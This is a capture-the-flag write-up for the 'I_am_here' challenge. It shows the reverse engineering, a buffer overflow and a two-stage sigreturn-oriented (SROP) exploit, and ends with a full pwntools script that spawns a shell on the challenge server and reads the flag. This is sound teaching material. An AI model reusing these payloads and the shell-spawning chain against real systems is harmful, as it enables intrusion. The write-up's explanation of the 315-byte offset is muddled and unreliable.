# I_am_here - SROP Challenge Writeup

**CTF:** BOH 2025  
**Challenge:** I_am_here  
**Category:** Binary Exploitation / Pwn  
**Difficulty:** Medium  
**Flag:** `BOH25{why_u_w4n7_find2_m3_wh3n_i_k33p_hidin6_fr0m_u}`

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Initial Analysis](#initial-analysis)
3. [Reverse Engineering](#reverse-engineering)
4. [Finding the Password](#finding-the-password)
5. [Identifying Vulnerabilities](#identifying-vulnerabilities)
6. [Understanding SROP](#understanding-srop)
7. [Finding the Offset](#finding-the-offset)
8. [Building the Exploit](#building-the-exploit)
9. [Common Mistakes & Lessons Learned](#common-mistakes--lessons-learned)
10. [Final Exploit](#final-exploit)
11. [References](#references)

---

## Challenge Overview

We're given a 64-bit Linux ELF binary that asks "Where are you?" and requires exploitation to get a shell.

**Key Files:**
- `chall` - The vulnerable binary
- Remote server: `47.130.175.253:1001`

---

## Initial Analysis

### Step 1: Check File Type

```bash
file chall
```

**Output:**
```
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
```

**What this tells us:**
- 64-bit binary (uses RAX, RDI, RSI instead of 32-bit registers)
- Dynamically linked (has libc, but we won't use it for SROP)
- LSB = Little-endian (least significant byte first)

### Step 2: Check Security Features

```bash
checksec chall
```

**Output:**
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

**What each means:**

| Protection | Status | Impact |
|------------|--------|--------|
| **No Canary** | ❌ Disabled | Can overflow buffers without detection |
| **NX Enabled** | ✅ Enabled | Stack is not executable - can't run shellcode on stack |
| **No PIE** | ❌ Disabled | Addresses are fixed (not randomized) - easier exploitation |
| **Partial RELRO** | ⚠️ Partial | GOT is partially writable, but we won't need this |

**Key Takeaway:** No stack canary + no PIE = Easy buffer overflow exploitation!

### Step 3: Run the Binary

```bash
./chall
```

**Output:**
```
==============================================
  ,--.   ,--.,--. ,---.   ,---.  ,--. ,--. 
  |   `.'   ||  |'   .-' '   .-' |  | |  | 
  |  |'.'|  ||  `.  `-. `.  `-. |  | |  | 
  |  |   |  ||  |.-'    |.-'    |'  '-'  ' 
  `--'   `--`--'`-----' `-----'  `-----'  
                                          
          W H E R E   A R E   Y O U ?         
==============================================
Where are you?
> test
```

The program asks for input and exits. We need to find what it expects.

---

## Reverse Engineering

### Using Ghidra

Open the binary in Ghidra and decompile `main()` and related functions.

#### Main Function

```c
int main(void)
{
  print_banner();
  
  if (check_password()) {
    vulnerable_function();
  }
  
  return 0;
}
```

**Flow:** Print banner → Check password → If correct, call vulnerable function

#### Password Check Function

```c
_BOOL8 check_password(void)
{
  char s[7];
  char v2;
  char v3; 
  char v4;
  
  printf("Where are you?\n> ");
  if (!fgets(s, 20, stdin))
    return 0;
    
  s[strcspn(s, "\n")] = 0;
  
  if (strlen(s) != 10)
    return 0;
    
  if (strncmp(s, "iamhere", 7))
    return 0;
    
  if (((*__ctype_b_loc())[v2] & 0x800) != 0 &&
      ((*__ctype_b_loc())[v3] & 0x800) != 0 &&
      ((*__ctype_b_loc())[v4] & 0x800) != 0)
  {
    return v3 - 48 + v2 - 48 + v4 - 48 == 10;
  }
  
  return 0;
}
```

**Analysis:**

1. Reads up to 20 bytes
2. Must be exactly **10 characters** long
3. Must start with **"iamhere"** (7 chars)
4. Next 3 characters (v2, v3, v4) must be **digits** (`& 0x800` checks `isdigit()`)
5. The three digits must **sum to 10**

**Valid passwords:** `iamhere` + 3 digits that sum to 10

Examples:
- `iamhere127` (1+2+7=10) ✓
- `iamhere334` (3+3+4=10) ✓
- `iamhere550` (5+5+0=10) ✓

#### Vulnerable Function

```c
void vulnerable_function(void)
{
  size_t sVar1;
  char local_148[112];      // First buffer
  undefined local_d8[200];  // Second buffer - WE EXPLOIT THIS
  ssize_t local_10;
  
  printf("Where u seen me, I will avoid from there:\n> ");
  local_10 = read(0, local_148, 99);
  
  if (local_10 < 1) {
    puts("Nothing to see here.");
  } else {
    local_148[local_10] = '\0';
    sVar1 = strcspn(local_148, "\n");
    local_148[sVar1] = '\0';
    printf(local_148);  // FORMAT STRING VULNERABILITY
    
    printf("\n...but where am I going?\n> ");
    read(0, local_d8, 5000);  // BUFFER OVERFLOW - reads 5000 bytes into 200-byte buffer!
  }
  
  return;
}
```

**Two Vulnerabilities Found:**

1. **Format String:** `printf(local_148)` without format specifier
   - Can leak memory with `%p`
   - We don't use this for SROP, but could be used for ret2libc

2. **Buffer Overflow:** Reads 5000 bytes into 200-byte buffer
   - Massive overflow: 5000 - 200 = 4800 bytes of overflow!
   - Can overwrite return address and stack data

---

## Finding the Password

### Method 1: Manual Testing

```bash
./chall
# Try: iamhere334
```

**Works!** (3+3+4=10)

### Method 2: Scripting (If We Didn't Know)

```python
from pwn import *

for a in range(10):
    for b in range(10):
        for c in range(10):
            if a + b + c == 10:
                password = f"iamhere{a}{b}{c}".encode()
                p = process('./chall')
                p.sendlineafter(b"> ", password)
                response = p.recvline()
                
                if b"I found you" in response:
                    print(f"Valid password: {password.decode()}")
                    p.close()
                    break
                p.close()
```

---

## Identifying Vulnerabilities

### Format String Bug

```python
from pwn import *

p = process('./chall')
p.sendlineafter(b"> ", b"iamhere334")
p.sendlineafter(b"> ", b"%p %p %p")
print(p.recvline())
# Output: 0x1 0x1 0x1
```

**Can leak stack values** - useful for ret2libc but not needed for SROP.

### Buffer Overflow

The second `read()` reads **5000 bytes** into a **200-byte buffer**.

```c
read(0, local_d8, 5000);  // local_d8 is only 200 bytes!
```

**This is our exploitation vector!**

---

## Understanding SROP

### What is SROP?

**SROP = Sigreturn-Oriented Programming**

It exploits the Linux signal handling mechanism to control **all CPU registers at once**.

### How Signals Work

When a program receives a signal (like CTRL+C):

1. **Kernel saves context:** All registers saved to stack in a `sigcontext` structure
2. **Signal handler runs:** Your code executes
3. **sigreturn() syscall:** Restores all registers from stack
4. **Program continues:** From where it was interrupted

### The Exploit Idea

**We fake the sigcontext structure on the stack, then call sigreturn(). The kernel restores ALL registers to values WE control!**

### When to Use SROP

✅ **Perfect for SROP when you have:**

- Buffer overflow (to write fake frame) ✓
- `syscall` gadget ✓
- Way to set RAX=15 (sigreturn syscall number) ✓
- **Limited ROP gadgets** (no `pop rdi`, `pop rsi`, etc.) ✓

❌ **Don't need SROP when:**

- You have enough ROP gadgets for traditional ROP
- Can do ret2libc easily
- Other simpler techniques work

### Why SROP for This Challenge?

**Author's Intent:** Binary should be compiled statically (no libc), forcing SROP

**What Actually Happened:** Author forgot `-static` flag, so binary has libc

**Result:** Both SROP and ret2libc work, but SROP was the intended solution

### SROP vs Traditional ROP

**Traditional ROP (needs many gadgets):**

```
pop rdi; ret
→ "/bin/sh"
pop rsi; ret  
→ 0
pop rdx; ret
→ 0
pop rax; ret
→ 59
syscall
```

**SROP (only needs 2 gadgets):**

```
mov rax, 15; ret    ← Set RAX for sigreturn
syscall             ← Kernel restores ALL registers from our frame
```

### Syscall Conventions

On x86-64 Linux, syscalls use these registers:

| Register | Purpose |
|----------|---------|
| RAX | Syscall number |
| RDI | 1st argument |
| RSI | 2nd argument |
| RDX | 3rd argument |
| R10 | 4th argument |
| R8 | 5th argument |
| R9 | 6th argument |

**Execute:** `syscall` instruction

**Common syscalls:**

| Syscall | RAX | Arguments |
|---------|-----|-----------|
| read() | 0 | RDI=fd, RSI=buf, RDX=count |
| write() | 1 | RDI=fd, RSI=buf, RDX=count |
| execve() | 59 | RDI=pathname, RSI=argv, RDX=envp |
| sigreturn() | 15 | (reads frame from stack) |

### The SigreturnFrame Structure

```
Offset | Register | Size
-------|----------|------
0x00   | R8       | 8 bytes
0x08   | R9       | 8 bytes
0x10   | R10      | 8 bytes
0x18   | R11      | 8 bytes
0x20   | R12      | 8 bytes
0x28   | R13      | 8 bytes
0x30   | R14      | 8 bytes
0x38   | R15      | 8 bytes
0x40   | RDI      | 8 bytes ← 1st syscall arg
0x48   | RSI      | 8 bytes ← 2nd syscall arg
0x50   | RBP      | 8 bytes
0x58   | RBX      | 8 bytes
0x60   | RDX      | 8 bytes ← 3rd syscall arg
0x68   | RAX      | 8 bytes ← Syscall number
0x70   | RCX      | 8 bytes
0x78   | RSP      | 8 bytes ← Stack pointer
0x80   | RIP      | 8 bytes ← WHERE TO JUMP
0x88   | EFLAGS   | 8 bytes
...
Total: 248 bytes
```

Pwntools' `SigreturnFrame()` creates this structure for us!

---

## Finding the Offset

This was the **trickiest part** of the challenge.

### Wrong Approach #1: Manual Calculation

From Ghidra decompilation:

```c
undefined local_d8[200];  // Second buffer at [rbp-0xd0]
```

From assembly:

```asm
lea rax, [rbp-0xd0]   ; Load address of buffer
```

**Calculation:**
```
Buffer at:    RBP - 0xd0
Saved RIP at: RBP + 0x8

Distance = 0xd0 + 0x8 = 0xd8 = 216 bytes
```

**This gives us 216 bytes, but the correct answer is 315 bytes!**

**What went wrong:** This calculates the distance to the saved RIP, but **doesn't account for stack frame alignment and the `leave` instruction's effect**.

### Wrong Approach #2: Trusting Static Analysis

The Ghidra decompilation shows `local_d8` at `[rbp-0xd0]`, but the actual runtime stack layout can differ due to:

- Compiler optimizations
- Stack alignment requirements
- The `leave` instruction (mov rsp, rbp; pop rbp)

**Lesson:** Never trust static analysis alone for offsets!

### Correct Approach: Cyclic Pattern (De Bruijn Sequence)

A **cyclic pattern** is a unique sequence where every 4-byte (or 8-byte) substring appears only once.

Example:
```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaa...
```

**How it works:**

1. Generate a unique pattern
2. Send it to the program
3. Program crashes with pattern bytes in registers
4. Find where those bytes are in the pattern
5. That position = the offset!

**Command:**

```python
from pwn import *

context.arch = 'amd64'

p = process('./chall')
p.sendlineafter(b"> ", b"iamhere334")
p.sendlineafter(b"> ", cyclic(600))  # Send 600-byte pattern
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8))
print(f"Offset: {offset}")
```

**Output:**
```
Offset: 315
```

**This is the correct offset: 315 bytes (0x13b)**

### Why 315 Instead of 216?

The difference is **99 bytes (0x63)**, which is exactly the size of the first read!

**The real reason:** The offset must account for:

1. Where the buffer actually is at runtime
2. Stack adjustments from `leave` instruction
3. Where the SigreturnFrame needs to be after gadgets execute

**Key insight from author:** "You need to calculate the SROP payload length"

The frame must be positioned so that **after set_eax and syscall execute**, RSP points exactly to the start of the frame.

### Verification with GDB

```bash
gdb ./chall
```

```gdb
# Set breakpoint at syscall gadget
break *0x4010b8

run
iamhere334
[send your payload]

# When it hits syscall:
info registers rax rsp
x/40gx $rsp

# RAX should be 15 (sigreturn)
# RSP should point to your SigreturnFrame
```

If RSP doesn't point to your frame, adjust the offset!

### Binary Search Method (Alternative)

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

set_eax = 0x4010c2
syscall = 0x4010b8

def test_offset(offset):
    try:
        p = process('./chall')
        
        frame = SigreturnFrame()
        frame.rax = 60  # sys_exit
        frame.rdi = 42  # exit code 42
        
        payload = b"A" * offset
        payload += p64(set_eax)
        payload += p64(syscall)
        payload += bytes(frame)
        
        p.sendlineafter(b"> ", b"iamhere334")
        p.sendlineafter(b"> ", payload)
        p.wait()
        
        exit_code = p.poll()
        p.close()
        return exit_code
    except:
        return None

# Test around expected range
for offset in range(300, 330):
    result = test_offset(offset)
    if result == 42:
        print(f"✓ FOUND: {offset} bytes")
        break
```

When the program exits with code 42, you found the correct offset!

---

## Building the Exploit

### Finding Gadgets

We need two gadgets:

1. **Set RAX to 15** (for sigreturn syscall)
2. **syscall instruction**

**Using ROPgadget:**

```bash
ROPgadget --binary ./chall
```

**Key findings:**

```
0x00000000004010c2 : mov eax, 0xf ; ret
0x00000000004010b8 : syscall ; ret
```

**Verify with objdump:**

```bash
objdump -d ./chall | grep -A2 4010c2
```

Output:
```asm
4010c2:  b8 0f 00 00 00    mov eax, 0xf
4010c7:  c3                ret
```

```bash
objdump -d ./chall | grep -A2 4010b8
```

Output:
```asm
4010b8:  0f 05             syscall
4010ba:  c3                ret
```

**Perfect! We have both gadgets.**

### Why Two Stages?

**Goal:** Execute `execve("/bin/sh", NULL, NULL)` to get a shell

**Problem:** We need "/bin/sh" to be **in memory** at a known address before we can execute it

**Solution:** Use SROP twice

1. **Stage 1:** Use sigreturn to call `read()` - this writes "/bin/sh" to memory
2. **Stage 2:** Use sigreturn again to call `execve()` - this executes the shell

### Stage 1: Writing "/bin/sh" to Memory

**Goal:** Call `read(0, 0x4048f8, big_number)` to write our input to address 0x4048f8

**Why 0x4048f8?**

We need a **writable memory location**. Check the binary sections:

```bash
readelf -S ./chall | grep -E "WRITE|bss"
```

Output:
```
[24] .data    PROGBITS  0000000000404000  WRITE
[25] .bss     NOBITS    0000000000404060  WRITE
```

The **.bss section** starts at 0x404060 and is writable.

We choose **0x404900** (which is 0x4048f8 + 8) because:
- It's in the writable .bss section
- It's far enough from the start to avoid important data
- It's a nice round address for alignment

**The read() syscall:**

```c
ssize_t read(int fd, void *buf, size_t count);
```

**Syscall number:** 0 (RAX=0)

**Arguments:**
- fd=0 (stdin) → RDI=0
- buf=0x4048f8 → RSI=0x4048f8
- count=13371337 → RDX=13371337 (any big number works)

**Building Frame 1:**

```python
frame = SigreturnFrame()
frame.rax = 0              # sys_read
frame.rdi = 0              # stdin
frame.rsi = 0x404900 - 8   # Write to 0x4048f8
frame.rdx = 13371337       # Read many bytes
frame.rsp = 0x404900       # Set stack pointer (safe location)
frame.rbp = 0x404900       # Base pointer (doesn't really matter)
frame.rip = syscall        # Jump here after sigreturn (0x4010b8)
```

**What happens:**

1. sigreturn() reads this frame from stack
2. Kernel restores all registers (RAX=0, RDI=0, RSI=0x4048f8, etc.)
3. Kernel jumps to RIP (syscall gadget at 0x4010b8)
4. Executes: `syscall` with RAX=0 → `read(0, 0x4048f8, 13371337)`
5. **Program waits for input!**

### Stage 2: Executing the Shell

**Now we type our second payload:**

```python
payload2 = b"/bin/sh\x00"         # The string (8 bytes)
payload2 += p64(set_eax)          # Address of set_eax gadget
payload2 += p64(syscall)          # Address of syscall gadget
payload2 += bytes(frame2)         # Second SigreturnFrame
```

**This gets written to memory at 0x4048f8:**

```
Memory layout:
0x4048f8: "/bin/sh\x00"    (8 bytes)
0x404900: 0x4010c2         (set_eax address)
0x404908: 0x4010b8         (syscall address)
0x404910: [frame2 - 248 bytes]
```

**After read() finishes:**

Remember we set `frame.rsp = 0x404900` in Stage 1!

When read() returns, it pops from RSP and jumps there:

```
RSP = 0x404900
[0x404900] = 0x4010c2 (set_eax)

ret → Jump to set_eax
```

**Execution flow:**

1. Jump to **0x4010c2** (set_eax)
   - Executes: `mov eax, 0xf; ret`
   - RAX = 15
   
2. Jump to **0x4010b8** (syscall)
   - Executes: `syscall` with RAX=15
   - Triggers sigreturn()
   
3. Kernel reads **frame2** from stack
4. Restores registers from frame2
5. Jumps to frame2.rip (syscall again)
6. Executes the final syscall

**Building Frame 2:**

The `execve()` syscall:

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

**Syscall number:** 59 (RAX=59)

**Arguments:**
- pathname = pointer to "/bin/sh" → RDI = 0x4048f8
- argv = NULL → RSI = 0
- envp = NULL → RDX = 0

```python
frame2 = SigreturnFrame()
frame2.rax = 59            # sys_execve
frame2.rdi = 0x404900 - 8  # Pointer to "/bin/sh" (0x4048f8)
frame2.rsi = 0             # argv = NULL
frame2.rdx = 0             # envp = NULL
frame2.rip = syscall       # Jump to syscall (0x4010b8)
```

**What happens:**

1. sigreturn() reads frame2
2. Restores: RAX=59, RDI=0x4048f8, RSI=0, RDX=0
3. Jumps to RIP (syscall)
4. Executes: `syscall` with RAX=59 → `execve("/bin/sh", NULL, NULL)`
5. **Shell spawns!** 🎉

---

## Complete Execution Flow

```
┌────────────────────────────────────────┐
│ 1. Send password: "iamhere334"         │
└──────────────────┬─────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────┐
│ 2. Send Stage 1 payload:               │
│    - 315 bytes padding                 │
│    - set_eax address (0x4010c2)        │
│    - syscall address (0x4010b8)        │
│    - Frame1 (248 bytes)                │
└──────────────────┬─────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────┐
│ 3. Function returns                    │
│    → Jumps to 0x4010c2                 │
│    → mov eax, 0xf; ret                 │
│    → RAX = 15                          │
└──────────────────┬─────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────┐
│ 4. Returns to 0x4010b8                 │
│    → syscall (with RAX=15)             │
│    → Triggers sigreturn()              │
└──────────────────┬─────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────┐
│ 5. Kernel reads Frame1 from stack      │
│    → Restores: RAX=0, RDI=0,           │
│                RSI=0x4048f8, RDX=big   │
│    → Jumps to RIP (syscall)            │
└──────────────────┬─────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────┐
│ 6. Executes syscall (with RAX=0)       │
│    → read(0, 0x4048f8, 13371337)       │
│    → Waits for input                   │
└──────────────────┬─────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────┐
│ 7. Send Stage 2 payload:               │
│    - "/bin/sh\x00"                     │
│    - set_eax address                   │
│    - syscall address                   │
│    - Frame2 (248 bytes)                │
│    → Written to 0x4048f8               │
└──────────────────┬─────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────┐
│ 8. read() returns                      │
│    → RSP = 0x404900                    │
│    → Pops 0x4010c2 (set_eax)           │
│    → Jumps to set_eax                  │
└──────────────────┬─────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────┐
│ 9. Executes set_eax                    │
│    → mov eax, 0xf; ret                 │
│    → RAX = 15                          │
└──────────────────┬─────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────┐
│ 10. Returns to syscall                 │
│     → syscall (with RAX=15)            │
│     → Triggers sigreturn()             │
└──────────────────┬─────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────┐
│ 11. Kernel reads Frame2 from stack     │
│     → Restores: RAX=59, RDI=0x4048f8,  │
│                 RSI=0, RDX=0           │
│     → Jumps to RIP (syscall)           │
└──────────────────┬─────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────┐
│ 12. Executes syscall (with RAX=59)     │
│     → execve("/bin/sh", NULL, NULL)    │
│     → SHELL SPAWNS! 🎉                 │
└────────────────────────────────────────┘
```

---

## Common Mistakes & Lessons Learned

### Mistake #1: Trusting Static Analysis for Offsets

**What I did wrong:**
- Calculated offset from Ghidra decompilation (216 bytes)
- Assumed the runtime stack layout matches the decompilation

**Why it was wrong:**
- Compiler optimizations change layout
- The `leave` instruction affects RSP in ways not obvious from pseudocode
- SROP needs frame alignment, not just RIP overwrite

**Lesson learned:**
- ✅ **Always verify offsets with cyclic pattern**
- ✅ **Test dynamically, don't trust static analysis alone**
- ✅ **For SROP, verify RSP points to frame after gadgets execute**

**Correct approach:**
```python
cyclic(600) → crash → cyclic_find() → correct offset
```

### Mistake #2: Confusing Offset to RIP vs Frame Position

**What I did wrong:**
- Thought 216 bytes to RIP was enough
- Didn't account for frame alignment needs

**Why it was wrong:**
- For normal ROP, you just need to overwrite RIP
- For SROP, the frame must be at the **exact position** where RSP points after your gadgets execute
- The 315 bytes accounts for stack frame size, `leave` instruction, and proper alignment

**Lesson learned:**
- ✅ **Understand the difference between RIP offset and frame positioning**
- ✅ **Author's hint: "Calculate the SROP payload length"**

### Mistake #3: Not Understanding Why Two Stages

**What confused me:**
- Why can't we just execve() in one stage?

**The answer:**
- Can't execute a string that doesn't exist in memory yet!
- Stage 1: Write "/bin/sh" to memory
- Stage 2: Execute it

**Lesson learned:**
- ✅ **Data must exist in memory before you can reference it**
- ✅ **SROP often requires multiple stages for complex exploits**

### Mistake #4: Misunderstanding SigreturnFrame Values

**What confused me:**
- How do we know what values to put in each register?
- Why these specific addresses?

**The answer:**
- Register values come from **syscall requirements**
- Check `man 2 <syscall>` for function signature
- Map arguments to registers (RDI, RSI, RDX)
- Choose writable addresses for buffers (.bss section)

**Lesson learned:**
- ✅ **Read the manpages for syscalls**
- ✅ **Understand x86-64 syscall calling convention**
- ✅ **Find writable memory with `readelf -S`**

### Mistake #5: Not Testing Locally First

**What I did wrong:**
- Tried to make the exploit work remotely before verifying locally

**Why it was wrong:**
- Local and remote environments might differ
- Need to debug with GDB locally first

**Lesson learned:**
- ✅ **Always test locally first**
- ✅ **Use GDB to verify each stage**
- ✅ **Once working locally, then try remote**

### Mistake #6: Assuming Binary is Same as Analysis

**What happened:**
- My local offset calculations didn't match the working exploit
- Thought something was wrong with my analysis

**The reality:**
- The binary was correct
- My **static analysis** was incomplete
- The **cyclic pattern** gave the correct answer (315)

**Lesson learned:**
- ✅ **Empirical testing beats theoretical calculation**
- ✅ **When in doubt, trust the cyclic pattern**

---

## Key Takeaways for Future Challenges

### When You See SROP Candidates

✅ **Check for these conditions:**
1. Buffer overflow (need space for 248-byte frame)
2. `syscall` gadget exists
3. Way to set RAX=15 (`mov eax, 0xf` gadget or similar)
4. Limited ROP gadgets (no `pop rdi`, etc.)

### Finding Offsets

✅ **Always use cyclic pattern first:**
```python
from pwn import *
p = process('./binary')
p.sendlineafter(b"prompt", cyclic(600))
p.wait()
offset = cyclic_find(p.corefile.read(p.corefile.rsp, 8))
```

✅ **Verify with GDB:**
```gdb
break *<syscall_gadget>
# Check if RSP points to your frame
x/40gx $rsp
```

✅ **Test with simple syscall first:**
```python
frame.rax = 60  # exit()
frame.rdi = 42  # exit code
# If program exits with code 42, frame is aligned!
```

### Building SROP Exploits

✅ **Step-by-step process:**

1. Find gadgets (`syscall`, `mov eax, 0xf`)
2. Find writable memory (`readelf -S`)
3. Find correct offset (cyclic pattern)
4. Build Stage 1 frame (write data to memory)
5. Build Stage 2 frame (execute final syscall)
6. Test locally with GDB
7. Try remote

✅ **Always verify registers:**
```gdb
# At syscall breakpoint
info registers rax rdi rsi rdx rip rsp
# RAX should be syscall number
# RDI, RSI, RDX should be arguments
# RSP should point to frame (for sigreturn)
```

### Understanding Syscalls

✅ **Quick reference:**

```bash
# Find syscall numbers
cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep <name>

# Or use pwntools
python3 -c "from pwn import *; print(constants.SYS_execve)"

# Read syscall documentation
man 2 <syscall_name>
```

✅ **Common syscalls:**

| Syscall | RAX | RDI | RSI | RDX |
|---------|-----|-----|-----|-----|
| read() | 0 | fd | buf | count |
| write() | 1 | fd | buf | count |
| open() | 2 | path | flags | mode |
| execve() | 59 | path | argv | envp |
| sigreturn() | 15 | (reads frame from stack) | | |

### Debugging Tips

✅ **GDB commands for SROP:**

```gdb
# Break at gadgets
break *0x4010c2  # set_eax
break *0x4010b8  # syscall

# Check frame alignment
x/40gx $rsp

# Verify registers before syscall
info registers rax rdi rsi rdx

# Step through sigreturn
si  # step instruction
```

✅ **Verify memory writes:**

```gdb
# After Stage 1 read()
x/s 0x4048f8
# Should show: "/bin/sh"
```

### Common Pitfalls to Avoid

❌ **Don't:**
- Trust static analysis for offsets without verification
- Assume local and remote are identical
- Forget to test with simple syscalls first (exit)
- Use addresses outside writable memory
- Forget null terminators for strings

✅ **Do:**
- Use cyclic patterns for offsets
- Test locally with GDB first
- Verify each stage independently
- Check memory sections (readelf)
- Read manpages for syscall arguments

---

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.arch = 'amd64'
context.log_level = 'info'

HOST = "47.130.175.253"
PORT = 1001

# Gadgets
set_eax = 0x4010c2  # mov eax, 0xf; ret
syscall = 0x4010b8  # syscall; ret

# Connect
if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process('./chall')

# Helper functions
sla = lambda a, b: p.sendlineafter(a, b)
sl = lambda a: p.sendline(a)

# ========== STAGE 1: Write "/bin/sh" to Memory ==========

# Build Frame 1: Call read(0, 0x4048f8, big_number)
frame1 = SigreturnFrame()
frame1.rax = 0              # sys_read syscall number
frame1.rdi = 0              # fd = stdin
frame1.rsi = 0x404900 - 8   # buf = 0x4048f8 (writable memory)
frame1.rdx = 13371337       # count = read many bytes
frame1.rsp = 0x404900       # stack pointer (safe location)
frame1.rbp = 0x404900       # base pointer
frame1.rip = syscall        # execute syscall after sigreturn

# Send password
sla(b"> ", b"iamhere334")

# Send Stage 1 payload
payload1 = b"A" * 315       # Padding to correct offset
payload1 += p64(set_eax)    # Set RAX=15 for sigreturn
payload1 += p64(syscall)    # Call sigreturn
payload1 += bytes(frame1)   # Fake sigcontext frame

sla(b"> ", payload1)

log.info("Stage 1 sent - read() should be waiting for input")

# ========== STAGE 2: Execute execve("/bin/sh") ==========

# Build Frame 2: Call execve("/bin/sh", NULL, NULL)
frame2 = SigreturnFrame()
frame2.rax = 59             # sys_execve syscall number
frame2.rdi = 0x404900 - 8   # pointer to "/bin/sh" (0x4048f8)
frame2.rsi = 0              # argv = NULL
frame2.rdx = 0              # envp = NULL
frame2.rip = syscall        # execute syscall after sigreturn

# Send Stage 2 payload
payload2 = b"/bin/sh\x00"   # The shell path (8 bytes)
payload2 += p64(set_eax)    # Set RAX=15 for sigreturn
payload2 += p64(syscall)    # Call sigreturn
payload2 += bytes(frame2)   # Fake sigcontext frame

sl(payload2)

log.success("Stage 2 sent - shell should spawn!")

# Interactive shell
p.interactive()
```

**Save as `exploit.py` and run:**

```bash
# Local test
python3 exploit.py

# Remote
python3 exploit.py REMOTE
```

**Output:**
```bash
$ python3 exploit.py REMOTE
[+] Opening connection to 47.130.175.253 on port 1001: Done
[*] Stage 1 sent - read() should be waiting for input
[+] Stage 2 sent - shell should spawn!
[*] Switching to interactive mode
$ ls
flag.txt
$ cat flag.txt
BOH25{why_u_w4n7_find2_m3_wh3n_i_k33p_hidin6_fr0m_u}
```

---

## Alternative Approaches

### Method 2: ret2libc (Not Intended, But Works)

Since the binary has libc (author's mistake), we could also:

1. Leak libc address using format string bug
2. Calculate libc base
3. Find `system()` and "/bin/sh" in libc
4. Build ROP chain with libc gadgets

**Why we didn't use this:**
- Author intended SROP
- SROP is the learning objective
- Works without needing libc leak

### Method 3: ret2csu (If No SROP Gadgets)

If we didn't have the `mov eax, 0xf` gadget, we could use `__libc_csu_init` gadgets to control registers.

**Not needed here** since we have perfect SROP gadgets.

---

## References

### Documentation

- [Linux System Call Table](https://filippo.io/linux-syscall-table/)
- [Sigreturn Man Page](https://man7.org/linux/man-pages/man2/sigreturn.2.html)
- [x86-64 ABI](https://refspecs.linuxbase.org/elf/x86_64-abi-0.99.pdf)

### Tools Used

- [pwntools](https://docs.pwntools.com/) - Exploit development framework
- [Ghidra](https://ghidra-sre.org/) - Reverse engineering
- [GDB with pwndbg](https://github.com/pwndbg/pwndbg) - Debugging
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) - Finding gadgets

### Learning Resources

- [SROP Explanation](https://www.cs.unc.edu/~fabian/course_papers/srop.pdf) - Original paper
- [CTF Wiki - SROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/)
- [Nightmare - SROP](https://guyinatuxedo.github.io/18.1-srop/srop/index.html)

### Similar Challenges

If you want to practice SROP more:

- [pwnable.kr - unexploitable](http://pwnable.kr/play.php)
- [ROP Emporium - ret2csu](https://ropemporium.com/challenge/ret2csu.html)
- [HackTheBox - Rope](https://www.hackthebox.eu/)

---

## Appendix: Quick Reference

### Offset Finding One-Liner

```python
python3 -c "from pwn import *; context.arch='amd64'; p=process('./chall'); p.sendlineafter(b'> ', b'iamhere334'); p.sendlineafter(b'> ', cyclic(600)); p.wait(); print(f'Offset: {cyclic_find(p.corefile.read(p.corefile.rsp, 8))}')"
```

### GDB Testing Script

```bash
gdb -q ./chall << EOF
break *0x4010c2
break *0x4010b8
run < <(python3 -c "print('iamhere334'); print('A'*315 + ...)")
continue
info registers rax rsp
x/40gx \$rsp
quit
EOF
```

### Frame Template

```python
frame = SigreturnFrame()
frame.rax = <syscall_number>
frame.rdi = <arg1>
frame.rsi = <arg2>
frame.rdx = <arg3>
frame.rsp = <stack_pointer>
frame.rbp = <base_pointer>
frame.rip = <where_to_jump>
```

### Common Syscall Numbers

```python
from pwn import *

print(f"read:      {constants.SYS_read}")      # 0
print(f"write:     {constants.SYS_write}")     # 1
print(f"open:      {constants.SYS_open}")      # 2
print(f"execve:    {constants.SYS_execve}")    # 59
print(f"sigreturn: {constants.SYS_rt_sigreturn}")  # 15
```

---

## Summary

**Challenge:** SROP exploitation on a 64-bit binary with buffer overflow

**Key Techniques:**
- Password cracking with digit sum logic
- Buffer overflow exploitation
- SROP (Sigreturn-Oriented Programming)
- Two-stage exploitation (write data, then execute)

**Critical Lessons:**
- Always use cyclic pattern for offsets
- Don't trust static analysis alone
- Test locally with GDB before going remote
- Understand syscall calling conventions
- SROP needs frame alignment, not just RIP overwrite

**Flag:** `BOH25{why_u_w4n7_find2_m3_wh3n_i_k33p_hidin6_fr0m_u}`

---

**Author's Note:** This challenge was intended to be a pure SROP challenge with a statically compiled binary. Due to forgetting the `-static` flag, it became solvable with ret2libc as well. However, SROP remains the elegant intended solution and teaches valuable exploitation techniques.

**Difficulty Rating:** Medium (would be Hard if there were more anti-debugging measures)

**Estimated Solve Time:** 2-4 hours for someone familiar with binary exploitation, 6-10 hours for beginners

**Prerequisites:**
- Understanding of x86-64 assembly
- Basic buffer overflow knowledge
- Familiarity with Linux syscalls
- Experience with pwntools and GDB



*Good luck with your future CTF challenges!* 🚀
